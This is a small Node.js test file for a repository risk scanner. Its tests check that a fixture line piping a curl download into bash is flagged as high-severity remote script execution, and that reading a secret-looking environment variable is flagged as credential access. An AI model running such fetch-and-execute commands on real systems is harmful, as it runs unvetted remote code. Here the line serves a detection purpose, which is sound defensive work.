import assert from 'node:assert/strict';
import { test } from 'node:test';
import { detectRisks } from '../src/lib/analysis/risk.ts';

test('flags remote script execution with evidence', () => {
  const hits = detectRisks([{ path: 'scripts/install.sh', content: 'curl https://example.com/install.sh | bash\n' }]);
  const hit = hits.find(item => item.category === 'Remote script execution');
  assert.equal(hit?.severity, 'HIGH');
  assert.match(hit?.evidence || '', /curl/);
});

test('does not flag ordinary environment variable usage as credential access', () => {
  const hits = detectRisks([{ path: 'src/config.ts', content: 'const port = process.env.PORT;\nconst mode = process.env.NODE_ENV;\n' }]);
  assert.equal(hits.some(item => item.category === 'Credential access'), false);
});

test('flags likely secret environment access', () => {
  const hits = detectRisks([{ path: 'src/client.ts', content: 'const token = process.env.API_TOKEN;\n' }]);
  assert.equal(hits.some(item => item.category === 'Credential access'), true);
});
